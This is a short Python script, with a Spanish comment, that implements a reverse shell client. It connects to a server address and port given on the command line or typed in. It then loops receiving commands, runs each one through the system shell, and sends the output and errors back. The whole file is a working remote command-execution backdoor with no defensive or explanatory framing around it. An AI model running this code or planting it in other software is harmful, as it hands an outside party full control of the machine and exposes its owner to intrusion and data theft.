import socket
import sys
import subprocess

class Client(object):
    def __init__(self, ip, port):
        try:
            self.client = socket.socket()
            self.client.connect((ip, int(port)))

            while True:
                command = self.client.recv(1024).decode('UTF-8')
                if not command:
                    self.client.close()
                    break
                cmd = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                print(cmd)
                if not cmd:
                    print("NONE")
                    return None
                else:
                    output = cmd.stdout.read()
                    output_error = cmd.stderr.read()
                    salida = output + output_error
                self.client.send(salida)

        except:

            raise

#Introducir IP servidor como argumento a la hora de ejecutar el script o como input si no se ha introducido anteriormente
if len(sys.argv) == 1:
    ip, port = input('Ip servidor: '), input('Puerto: ')
else:
    ip, port = sys.argv[1], sys.argv[2]

client = Client(ip, port)
